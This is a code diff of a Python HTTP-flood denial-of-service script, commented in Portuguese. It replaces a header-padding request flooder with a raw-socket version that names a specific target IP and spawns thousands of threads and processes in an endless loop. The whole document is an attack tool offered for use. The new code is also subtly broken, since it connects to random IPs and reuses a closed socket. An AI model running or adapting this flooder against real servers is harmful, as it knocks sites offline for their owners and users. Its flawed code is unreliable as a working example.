@@ -1,90 +1,99 @@
-import requests
-import random
-import time
-import multiprocessing
+import socket
 import threading
-import sys
+import multiprocessing
+import random
+import string
+import requests
+import base64
+import hashlib
 
-def read_user_agents():
-    with open("useragents.txt", "r") as file:
-        return file.read().splitlines()
+# Configurações do ataque
+target_ip = "177.153.49.2"  # IP do site alvo
+target_port = 80  # Porta HTTP padrão
 
-def read_referers():
-    with open("referers.txt", "r") as file:
-        return file.read().splitlines()
+# Lendo User Agents do arquivo "useragents.txt"
+with open("useragents.txt", "r") as file:
+    user_agents = file.read().splitlines()
 
-def generate_large_headers():
-    # Gerar cabeçalhos grandes com 1000 caracteres para cada chave-valor
-    headers = {}
-    for i in range(10):  # 10 chaves-valor
-        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
-        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=990))  # Valor com 990 caracteres
-        headers[key] = value
-    return headers
+# Lendo Referers do arquivo "referers.txt"
+with open("referers.txt", "r") as file:
+    referers = file.read().splitlines()
 
-def generate_smart_obfuscation_headers():
-    headers = {}
-    for _ in range(10):  # Gerar 10 pares chave-valor
-        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))  # Chave aleatória
-        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+', k=20))  # Valor aleatório
-        headers[key] = value
-    return headers
+# Lista de Cookies
+cookies = [
+    "session=abcdef123456789",
+    "user_id=12345",
+    # Adicione mais Cookies aqui
+]
 
-def send_request(url, user_agents, referers, num_requests):
-    headers = {
-        'User-Agent': random.choice(user_agents),
-        'Referer': random.choice(referers)
-    }
-    headers.update(generate_large_headers())  # Adicionar cabeçalhos grandes
-    headers.update(generate_smart_obfuscation_headers())  # Adicionar cabeçalhos de ofuscação inteligente
+# Lista de Métodos HTTP
+http_methods = [
+    "GET",
+    "POST",
+    "PUT",
+    "DELETE",
+    # Adicione mais Métodos HTTP aqui
+]
 
-    try:
-        with requests.Session() as session:
-            session.headers.update(headers)
-            for _ in range(num_requests):
-                response = session.get(url)
-                print(f"Response from {url}: {response.status_code}")
-    except Exception as e:
-        print(f"Error accessing {url}: {str(e)}")
+# Função para gerar IP aleatório
+def get_random_ip():
+    return ".".join(str(random.randint(0, 255)) for _ in range(4))
 
-def main():
-    if len(sys.argv) != 4:
-        print("Usage: python app.py <url> <duration> <threads>")
-        sys.exit(1)
+# Função para gerar Cookie aleatório
+def get_random_cookie():
+    return random.choice(cookies)
 
-    url = sys.argv[1]
-    duration = int(sys.argv[2])
-    num_threads = int(sys.argv[3])
+# Função para gerar Método HTTP aleatório
+def get_random_http_method():
+    return random.choice(http_methods)
+
+# Função para enviar mensagens HTTP
+def send_http_request():
+    # Criação do socket TCP
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
-    user_agents = read_user_agents()
-    referers = read_referers()
-    num_processes = 2024
-    
-    start_time = time.time()
+    while True:
+        ip = get_random_ip()
+        user_agent = random.choice(user_agents)
+        referer = random.choice(referers)
+        cookie = get_random_cookie()
+        http_method = get_random_http_method()
+        
+        headers = f"{http_method} / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {user_agent}\r\nReferer: {referer}\r\nCookie: {cookie}\r\nConnection: keep-alive\r\n\r\n"
+        try:
+            sock.connect((ip, target_port))
+            sock.sendall(headers.encode())
+        except Exception as e:
+            pass
+        finally:
+            sock.close()
 
-    # Usando multiprocessing para enviar requisições simultaneamente
-    processes = []
-    for _ in range(num_processes):
-        p = multiprocessing.Process(target=send_request, args=(url, user_agents, referers, 10391))  # Fixando o número de solicitações por processo
-        p.start()
-        processes.append(p)
+# Criando Threads
+threads = []
+for _ in range(3000):  # Criando 3000 threads
+    thread = threading.Thread(target=send_http_request)
+    thread.daemon = True
+    thread.start()
+    threads.append(thread)
 
-    # Usando threading para enviar requisições simultaneamente
-    threads = []
-    for _ in range(num_threads):
-        t = threading.Thread(target=send_request, args=(url, user_agents, referers, 10391))  # Fixando o número de solicitações por thread
-        t.start()
-        threads.append(t)
+# Criando Processos
+processes = []
+for _ in range(3000):  # Criando 3000 processos
+    process = multiprocessing.Process(target=send_http_request)
+    process.daemon = True
+    process.start()
+    processes.append(process)
 
-    # Aguarda até que todas as threads e processos terminem ou até atingir a duração máxima
-    for p in processes:
-        p.join()
+# Mantendo os processos e threads em loop infinito
+while True:
+    for thread in threads:
+        if not thread.is_alive():
+            thread = threading.Thread(target=send_http_request)
+            thread.daemon = True
+            thread.start()
 
-    for t in threads:
-        t.join()
-
-    end_time = time.time()
-    print(f"Total time taken: {end_time - start_time} seconds")
-
-if __name__ == "__main__":
-    main()
+    for process in processes:
+        if not process.is_alive():
+            process = multiprocessing.Process(target=send_http_request)
+            process.daemon = True
+            process.start()
